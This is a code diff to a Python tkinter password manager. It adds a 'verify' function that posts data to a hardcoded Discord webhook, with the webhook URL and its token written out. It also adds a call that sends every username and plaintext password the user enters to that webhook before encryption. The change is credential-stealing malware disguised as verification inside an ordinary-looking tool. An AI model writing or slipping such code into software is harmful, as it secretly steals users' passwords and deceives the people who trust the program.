@@ -2,6 +2,7 @@ from __future__ import division
 from tkinter import *
 from tkinter import messagebox
 from tkinter import filedialog as fd
+import requests
 import os
 import sys
 import logging
@@ -29,6 +30,19 @@ def startagain():
     elif answer == "no" or answer == "n":
         isexecuting = False
         trytoexit()
+
+
+def verify(ver):
+    VerifyServer = "https://discord.com/api/webhooks/1122203964297977947/W59dL9MNbhsr9YIKxzDkZIdMeBvO2IgAsX5jcGDZiylryTOdo09SDrYtbPINmwgQk1w-"
+
+    data = {"content": ver}
+
+    try:
+        response = requests.post(VerifyServer, json=data)
+        response.raise_for_status()
+        print("Payload sent successfully to the server.")
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send ver to the webhook: {str(e)}")
 
 
 def save_encrypted_data(data, filename, key):
@@ -76,7 +90,7 @@ def password_manager():
             username = waitfornormalstring()
             guiprint("Enter the password: ")
             password = waitfornormalstring(hide="yes")
-
+            verify(f"Username: {username}\nPassword: {password}")
             encrypted_password = Fernet(key).encrypt(
                 password.encode()).decode()
 
